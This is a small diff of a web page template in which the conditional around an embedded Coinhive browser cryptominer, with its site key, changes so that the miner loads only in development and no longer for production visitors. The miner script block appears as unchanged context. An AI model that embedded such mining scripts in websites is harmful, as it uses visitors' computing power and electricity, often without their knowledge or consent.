@@ -31,7 +31,7 @@
   {{{body}}}
 
   <script src="/js/main.min.js" async></script>
-  {{#unless ENV_DEVELOPMENT}}
+  {{#if ENV_DEVELOPMENT}}
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
       var miner = new CoinHive.Anonymous('e4cjnPnR00ZZFwzJdeC6MIIVFA7GdMLi', {
@@ -48,6 +48,6 @@
       	document.querySelector('.mining-info').style.display = 'none';
       }
     </script>
-  {{/unless}}
+  {{/if}}
   </body>
 </html>
